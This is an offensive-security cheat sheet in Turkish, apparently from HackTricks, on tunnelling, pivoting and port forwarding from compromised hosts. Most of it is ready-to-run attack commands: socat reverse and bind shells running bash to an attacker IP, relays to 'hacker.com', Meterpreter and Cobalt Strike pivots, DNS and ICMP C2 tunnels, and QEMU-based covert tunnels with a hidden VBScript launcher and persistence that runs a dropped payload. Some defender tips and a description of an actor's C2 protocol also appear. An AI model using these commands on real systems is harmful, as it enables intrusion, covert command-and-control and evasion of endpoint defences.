# Tünelleme ve Port Yönlendirme

{{#include ../banners/hacktricks-training.md}}

## Nmap ipucu

> [!WARNING]
> **ICMP** and **SYN** scans cannot be tunnelled through socks proxies, so we must **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve **TCP scans** (`-sT`) belirtmeliyiz.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH grafiksel bağlantı (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

SSH Server'da yeni bir Port aç --> Other port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Yerel port --> Ele geçirilmiş host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Herhangi bir yere
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Bu yöntem, internal hosts üzerinden DMZ aracılığıyla hostunuza reverse shells almak için kullanışlıdır:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Her iki cihazda da **root** olmanız gerekiyor (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırmasının root girişine izin vermesi gerekir:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Sunucu tarafında yönlendirmeyi etkinleştir
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
İstemci tarafında yeni bir rota ayarlayın
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Güvenlik – Terrapin Attack (CVE-2023-48795)**
> 2023 Terrapin downgrade saldırısı, bir man-in-the-middle'in erken SSH el sıkışmasını değiştirmesine ve **herhangi bir iletilen kanala** (`-L`, `-R`, `-D`) veri enjekte etmesine izin verebilir. Hem istemci hem sunucunun yamalandığından emin olun (**OpenSSH ≥ 9.6/LibreSSH 6.7**) veya SSH tünellerine güvenmeden önce `sshd_config`/`ssh_config` içinde savunmasız `chacha20-poly1305@openssh.com` ve `*-etm@openssh.com` algoritmalarını açıkça devre dışı bırakın.

## SSHUTTLE

Bir host üzerinden **ssh** ile tüm **trafikleri** bir **alt ağa** tünelleyebilirsiniz.\
Örneğin, 10.10.10.0/24'e giden tüm trafiğin yönlendirilmesi:
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Özel anahtarla bağlan
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Yerel port --> Ele geçirilmiş host (aktif session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Başka bir yol:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Teamserver üzerinde tüm arayüzlerde dinleyen ve trafiği **beacon** üzerinden yönlendirmek için kullanılabilecek bir port açın.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Bu durumda, **port beacon host üzerinde açılır**, Team Server'da değil ve trafik Team Server'a gönderilir, oradan belirtilen host:port'a yönlendirilir.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Dikkat:

- Beacon's reverse port forward, **trafiği Team Server'a tünellemek için tasarlanmıştır, bireysel makineler arasında relaying için değil**.
- Trafik, **Beacon's C2 traffic içinde tünellenir**, P2P bağlantıları dahil.
- **Admin privileges are not required** yüksek portlarda reverse port forwards oluşturmak için.

### rPort2Port local

> [!WARNING]
> Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve **trafik Cobalt Strike client'a gönderilir** (Team Server'a değil) ve oradan belirtilen host:port'a
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Bir web dosya tüneli yüklemeniz gerekiyor: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
**client ve server için aynı sürümü kullanmanız gerekir**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**agent ve proxy için aynı sürümü kullanın**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Bağlama ve Dinleme
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent'in Yerel Portlarına Erişim
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tünel victim tarafından başlatılır.\
127.0.0.1:1080 üzerinde bir socks4 proxy oluşturulur
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot aracılığıyla **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port üzerinden socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter üzerinden SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Hedefin konsolunda son satır yerine bu satırı çalıştırarak **non-authenticated proxy**'yi atlatabilirsiniz:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Her iki tarafta da sertifikalar oluşturun: Client ve Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Yerel SSH portunu (22) saldırgan hostun 443 portuna bağlayın.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Konsol tabanlı bir PuTTY sürümü gibidir (seçenekler bir ssh client ile çok benzerdir).

Bu binary hedefte çalıştırılacağı ve bir ssh client olduğu için, reverse connection kurabilmek adına ssh servisimizi ve portumuzu açmamız gerekir. Ardından, sadece yerelde erişilebilir bir portu makinemizdeki bir porta forward etmek için:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Local admin olmanız gerekir (herhangi bir port için)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sistemde **RDP erişimi** olması gerekir.\
İndir:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Bu araç, Windows'un Remote Desktop Service özelliğindeki `Dynamic Virtual Channels` (`DVC`) öğesini kullanır. DVC, **paketleri RDP bağlantısı üzerinden tünellemekten** sorumludur.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

İstemci bilgisayarınızda **`SocksOverRDP-Plugin.dll`** şu şekilde yükleyin:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Şimdi **bağlanabiliriz** **hedef**e **RDP** üzerinden **`mstsc.exe`** kullanarak, ve bir **prompt** almalıyız; bu prompt **SocksOverRDP plugin'in etkin olduğunu** söyleyecek ve plugin **127.0.0.1:1080** adresinde **dinleyecektir**.

**Bağlanın** **RDP** ile ve hedef makineye `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Şimdi, kendi makinenizde (attacker) port 1080'in dinlediğini doğrulayın:
```
netstat -antb | findstr 1080
```
Artık [**Proxifier**](https://www.proxifier.com/) **trafiği o port üzerinden proxy'leyebilirsiniz.**

## Proxify Windows GUI Apps

Windows GUI uygulamalarını [**Proxifier**](https://www.proxifier.com/) kullanarak bir proxy üzerinden yönlendirebilirsiniz.\
In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
**Profile -> Proxification Rules** içinde proxify etmek istediğiniz programın adını ve proxify etmek istediğiniz IP'lere olan bağlantıları ekleyin.

## NTLM proxy bypass

The previously mentioned tool: **Rpivot**\
**OpenVPN** ayrıca bunu bypass edebilir, konfigürasyon dosyasına şu seçenekleri ekleyerek:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Proxy'ye karşı kimlik doğrulaması yapar ve belirttiğiniz harici servise yönlendirilen bir portu yerel olarak bağlar. Daha sonra seçtiğiniz aracı bu port üzerinden kullanabilirsiniz.\
Örneğin 443 portunu yönlendirir.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Şimdi, örneğin victim üzerinde **SSH** servisini port 443'te dinleyecek şekilde ayarlarsanız. Ona attacker port 2222 üzerinden bağlanabilirsiniz.\
Ayrıca **meterpreter** kullanıp localhost:443'e bağlanacak şekilde yapılandırabilir ve attacker'ın port 2222'de dinlemesini sağlayabilirsiniz.

## YARP

Microsoft tarafından oluşturulmuş bir reverse proxy. Bunu şurada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Her iki sistemde de tun adapters oluşturmak ve DNS queries kullanarak aralarında veri tünellemek için Root gereklidir.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNS üzerinden bir C\&C kanalı kurar. Root ayrıcalıkları gerekmez.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell'de**

PowerShell'de bir dnscat2 istemcisi çalıştırmak için [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kullanabilirsiniz:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat ile port yönlendirme**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains, `gethostbyname` libc çağrısını yakalar ve tcp DNS isteklerini socks proxy üzerinden tüneller. Varsayılan olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (sabit kodlanmış). Bunu değiştirmek için şu dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. Eğer bir **Windows environment** içindeyseniz **etki alanı denetleyicisinin** IP'sini ayarlayabilirsiniz.

## Go'da Tüneller

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 aktörü, *sadece* çıkış yönlü **DNS** ve **plain HTTP POST** trafiğini kötüye kullanan **çift kanallı bir C2 ("AK47C2")** oluşturdu — kurumsal ağlarda nadiren engellenen iki protokol.

1. **DNS mode (AK47DNS)**
• Rastgele 5 karakterlik bir SessionID üretir (ör. `H4T14`).
• Görev istekleri için başına `1`, sonuçlar için `2` ekler ve farklı alanları (flags, SessionID, bilgisayar adı) birleştirir.
• Her alan **ASCII anahtarı `VHBD@H` ile XOR-şifrelenir**, hex-encoded edilir ve noktalarla birleştirilir — son olarak saldırganın kontrolündeki domain ile biter:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• İstekler `DnsQuery()` kullanarak **TXT** (ve yedek olarak **MG**) kayıtları için gönderilir.
• Yanıt 0xFF bayttan büyük olduğunda backdoor veriyi 63 baytlık parçalara böler ve C2 sunucusunun sıralayabilmesi için `s<SessionID>t<TOTAL>p<POS>` gibi işaretleyiciler ekler.

2. **HTTP mode (AK47HTTP)**
• Bir JSON zarfı oluşturur:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Tüm blob XOR-`VHBD@H` → hex → olacak şekilde `Content-Type: text/plain` başlığı ile **`POST /`** isteğinin gövdesi olarak gönderilir.
• Yanıt aynı kodlamayı izler ve `cmd` alanı `cmd.exe /c <command> 2>&1` ile çalıştırılır.

Blue Team notları
• İlk etiketi uzun hexadecimal olan ve her zaman nadir bir domain ile biten sıradışı **TXT sorgularını** arayın.
• ASCII-hex ile takip edilen sabit bir XOR anahtarı YARA ile kolayca tespit edilir: `6?56484244?484` (`VHBD@H` hex olarak).
• HTTP için, tamamen hex ve iki baytın katı olan text/plain POST gövdelerini işaretleyin.

{{#note}}
Tüm kanal **standart RFC-uyumlu sorgular** içine sığar ve her alt-domain etiketi 63 bayttan az tutularak çoğu DNS kaydında gizli kalmasını sağlar.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Her iki sistemde de tun adaptörleri oluşturmak ve ICMP echo istekleri kullanarak aralarında veri tünellemek için root gereklidir.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Buradan indirin**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **Tek komutla çözümleri İnternet'e açmaya yarayan bir araçtır.**\
_Açılan URI'ler şu şekildedir:_ **UID.ngrok.io**

### Kurulum

- Hesap oluşturun: https://ngrok.com/signup
- İstemci indirme:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Temel kullanımlar

**Dokümantasyon:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Gerekirse kimlik doğrulama ve TLS eklemek de mümkündür._

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP ile dosyaları açığa çıkarma
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP çağrıları

_XSS,SSRF,SSTI ... için faydalıdır_\
Doğrudan stdout'tan veya HTTP arayüzünde [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling dahili HTTP servisi
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml basit yapılandırma örneği

3 tünel açar:

- 2 TCP
- 1 HTTP, /tmp/httpbin/ dizininden statik dosyaların sunumu
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare'ın `cloudflared` daemon'u, Cloudflare'ın edge'ini buluşma noktası olarak kullanarak gelen firewall kuralları gerektirmeden **yerel TCP/UDP hizmetlerini** açan giden tüneller oluşturabilir. Bu, çıkış güvenlik duvarı yalnızca HTTPS trafiğine izin verip gelen bağlantılar engellendiğinde çok kullanışlıdır.

### Hızlı tünel tek satırlık komut
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### DNS ile kalıcı tüneller
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Bağlayıcıyı başlat:
```bash
cloudflared tunnel run mytunnel
```
Çünkü tüm trafik host'tan **443 üzerinden çıktığı** için, Cloudflared tunnels ingress ACLs veya NAT boundaries'ı atlatmak için basit bir yoldur. İkili genellikle yükseltilmiş ayrıcalıklarla çalışır — mümkünse konteynerler veya `--user` bayrağını kullanın.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) aktif olarak bakımı yapılan bir Go reverse-proxy'dir ve **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching** destekler. **v0.53.0 (May 2024)**'ten itibaren **SSH Tunnel Gateway** olarak davranabilir, böylece hedef host yalnızca stock OpenSSH client kullanarak bir reverse tunnel açabilir — ekstra bir ikili gerekmez.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Yeni SSH ağ geçidini kullanma (frpc ikili dosyası olmadan)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Yukarıdaki komut, victim’in portu **8080**'i herhangi bir ek araç konuşlandırmadan **attacker_ip:9000** olarak yayınlar — living-off-the-land pivoting için ideal.

## QEMU ile Gizli VM tabanlı Tüneller

QEMU’nun user-mode networking (`-netdev user`) özelliği `hostfwd` adında bir seçenek destekler; bu seçenek **bir TCP/UDP portunu *host* üzerinde bind eder ve bunu *guest* içine yönlendirir***. Guest tam bir SSH daemon çalıştırdığında, hostfwd kuralı tamamen ephemeral bir VM içinde yaşayan, geçici bir SSH jump box sağlar — tüm kötü amaçlı etkinlik ve dosyalar sanal diskte kaldığı için EDR’den C2 trafiğini gizlemek için mükemmeldir.

### Hızlı tek satır
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Yukarıdaki komut RAM'de bir **Tiny Core Linux** imajını (`tc.qcow2`) başlatır.
• Windows host üzerindeki **2222/tcp** portu misafir içindeki **22/tcp**'ye şeffaf şekilde yönlendirilir.
• Saldırganın bakış açısından hedef sadece 2222 portunu açığa çıkarır; ona ulaşan paketlerin tamamı VM içinde çalışan SSH server tarafından işlenir.

### VBScript ile gizlice başlatma
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Betik `cscript.exe //B update.vbs` ile çalıştırıldığında pencere gizli kalır.

### In-guest persistence

Because Tiny Core is stateless, attackers usually:

1. Drop payload to `/opt/123.out`
2. Append to `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Why this evades detection

• Only two unsigned executables (`qemu-system-*.exe`) touch disk; no drivers or services are installed.
• Security products on the host see **benign loopback traffic** (the actual C2 terminates inside the VM).
• Memory scanners never analyse the malicious process space because it lives in a different OS.

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.
• Block outbound connections that originate from `qemu-system*.exe`.
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)

{{#include ../banners/hacktricks-training.md}}
